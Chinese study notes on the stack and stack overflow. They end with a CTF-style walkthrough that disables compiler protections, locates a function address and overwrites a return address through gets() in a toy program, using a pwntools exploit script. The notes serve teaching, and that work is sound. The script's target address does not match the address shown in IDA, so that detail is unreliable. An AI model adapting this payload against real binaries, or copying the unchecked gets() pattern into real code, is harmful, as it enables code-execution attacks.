```table-of-contents
```

# 栈的概念
栈可以理解为一个特殊的容器，用户可以将数据依次放入栈中，然后再将数据按照相反的顺序从栈中取出。也就是说，先放入的数据最后才能取出，而最后放入的数据必须先取出。这称为先进后出（First In Last Out）原则。

放入数据常称为入栈或压栈（Push），取出数据常称为出栈或弹出（Pop）。如下图所示：

![](attachments/Pasted%20image%2020250103105238.png)

可以发现，栈底始终不动，出栈入栈只是在移动栈顶，当栈中没有数据时，栈顶和栈底重合。  

从本质上来讲，==栈是一段连续的内存，需要同时记录栈底和栈顶，才能对当前的栈进行定位==。
在现代计算机中，通常使用`ebp`寄存器指向栈底，而使用`esp`寄存器指向栈顶。随着数据的进栈出栈，`esp` 的值会不断变化，进栈时 `esp` 的值减小，出栈时 `esp` 的值增大。  
`ebp` 和 `esp` 都是`CPU中`的寄存器：`ebp` 是 `Extend Base Pointer` 的缩写，通常用来指向栈底；`esp` 是 `Extend Stack Pointer` 的缩写，通常用来指向栈顶。

如下图所示是一个栈的实例：
![](attachments/Pasted%20image%2020250103105450.png)

# 栈的特点
## 特点
### 函数级别
每个函数调用都会在栈上创建一个新的栈帧（stack frame），它包含了该函数的局部变量、参数和返回地址等信息。

### 后进先出 (LIFO)
 栈的操作遵循后进先出原则，最后被压入栈的内容最先被弹出。
### 自动管理
栈的内存分配和释放是自动的，函数结束时栈帧被销毁。

## 栈和函数以及线程的关系
**（1）栈是函数级别的**
栈是函数级别的，主要用于存储函数的局部变量、参数以及返回地址等信息。每当一个函数被调用时，系统会为该函数分配一块栈空间，函数执行完毕后，这块空间会被释放。

**（2）栈的最大空间是线程级别**
一个程序可以包含多个线程，每个线程都有自己的栈。
**==严格来说，栈的最大值是针对线程来说的==**，而不是针对程序。

# 栈的大小以及溢出
对每个程序来说，栈能使用的内存是有限的，一般是 1M~8M，这在编译时就已经决定了，程序运行期间不能再改变。
如果程序使用的栈内存超出最大值，就会发生栈溢出（Stack Overflow）错误。  

## 栈的大小
```bash
# ulimit -a
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1290490
max locked memory       (kbytes, -l) unlimited
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024000
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 10240
cpu time               (seconds, -t) unlimited
max user processes              (-u) 655350
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```
如上所示，栈的大小为10M。
## 栈的溢出
### 栈溢出的可能原因
#### 递归调用过深
当一个函数递归调用自身时，如果递归层数过多，可能会耗尽栈空间。

```c
void recursive_function() {
    // 每次调用都会在栈上分配新的栈帧
    recursive_function();
}

int main() {
    recursive_function(); // 可能导致栈溢出
    return 0;
}

```

#### 局部变量过大
如果在函数中定义了非常大的局部数组或结构体，可能会导致栈空间不足。
例如：
```c
void function() {
    int large_array[100000]; // 大数组可能导致栈溢出
}

```

#### 嵌套函数调用
 如果函数之间的调用层次过深，栈帧的累积也可能导致栈溢出。

### 栈溢出的影响
（1）导致与其相邻的栈中的变量的值被改变。

（2）栈溢出攻击：修改函数的返回地址，使其指向攻击代码。

当函数调用结束时程序跳转到攻击者设定的地址，修改函数指针，长跳转缓冲区来找到可溢出的缓冲区


### 解决栈溢出的方法
#### 增加栈大小
在某些系统中，可以通过修改系统的设置来增加每个线程的栈大小。例如，使用 `ulimit -s` 命令可以查看和设置栈的大小限制。

#### 使用动态内存分配
对于需要较大内存的变量，考虑使用 `malloc` 或 `calloc` 在堆上分配内存，而不是在栈上。
    
####  优化递归
如果使用递归，考虑将其改写为迭代形式，或使用尾递归优化（如果编译器支持）。
#### 避免过深的函数嵌套

尽量减少函数调用的层次，保持代码的简洁和可读性。

### 范例
**正常的程序范例**：
```c
# cat test_stack.c
#include <stdio.h>
int main(){

    printf("stack test start.\n");
    char str[1024*1024*2] = {0};
    printf("stack test end.\n");
    return 0;
}

编译以及测试：
# gcc -g -O0 test_stack.c -o test_stack2
# ./test_stack2
stack test start.
stack test end.
```


**栈溢出的程序范例**：
```c
# cat test_stack.c
#include <stdio.h>
int main(){

    printf("stack test start.\n");
    char str[1024*1024*20] = {0};
    printf("stack test end.\n");
    return 0;
}

编译以及测试：
# gcc -g -O0 test_stack.c -o test_stack
# ./test_stack
Segmentation fault (core dumped)
```

# 栈溢出攻击
最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限**。

```c
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```
这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行 success 函数。**

利用如下命令对其进行编译:
```bash
# gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.


注：
m32` 指的是生成 32 位程序； 
`-fno-stack-protector` 指的是不开启堆栈溢出保护，即不生成 canary。
```
## gets的危险性
可以看出 `gets` 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，

## CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护

栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让攻击代码能够得到执行。
当启用栈保护后，函数开始执行的时候会先往栈里插入`cookie`信息，当函数真正返回的时候会验证`cookie`信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将`cookie`信息给覆盖掉，导致栈保护检查失败而阻止攻击代码的执行。在Linux中我们将`cookie`信息称为`canary`。

因此在编译时可以控制是否开启栈保护以及程度，例如：
```bash
gcc -o test test.c                       #默认情况下，不开启Canary保护
gcc -fno-stack-protector -o test test.c  #禁用栈保护
gcc -fstack-protector -o test test.c     #启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c #启用堆栈保护，为所有函数插入保护代码

```

## PIE
此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。

不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令`gcc -v`查看 gcc 默认的开关情况。如果含有`--enable-default-pie`参数则代表 PIE 默认已开启，需要在编译指令中添加参数`-no-pie`。

## checksec 工具
编译成功后，可以使用 checksec 工具检查编译出的文件：
```bash
# checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 地址空间分布随机化(ASLR)
提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 `/proc/sys/kernel/randomize_va_space` 来控制 ASLR 启动与否，具体的选项有

- 0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。
- 1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。
- 2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。

## 反编译二进制程序
确认 ASLR 和 PIE 保护 关闭， 并设置了  `-fno-stack-protector`后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到：
```c
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

字符串`s`距离 `ebp` 的长度为 `0x14`，那么相应的栈结构为
```bash
           +-----------------+
           |     retaddr     |
           +-----------------+
           |     saved ebp   |
    ebp--->+-----------------+
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
s,ebp-0x14-->+-----------------+
```

并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。
```bash
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

## 构造攻击

如果我们读取的字符串为
```bash
0x14*'a'+'bbbb'+success_addr
```

由于 `gets` 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 `saved ebp` 覆盖为 `bbbb`，将 `retaddr` 覆盖为 `success_addr`，即，此时的栈结构为：

```bash
           +-----------------+
           |    0x0804843B   |
           +-----------------+
           |       bbbb      |
    ebp--->+-----------------+
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
s,ebp-0x14-->+-----------------+
```

需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 `0x0804843B` 在内存中的形式是:
```bash
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x08049186
## 构造payload
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

执行如下：可以看到我们确实已经执行 `success` 函数。
```bash
# python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```



# 堆栈和栈以及堆
![](attachments/Pasted%20image%2020250103105620.png)

# 参考
```bash
# （C语言内存十二）栈（Stack）是什么？栈溢出又是怎么回事？
https://www.cnblogs.com/still-smile/p/14900502.html

# Linux栈溢出总结（0x01）
https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/

# 栈溢出原理
https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/
```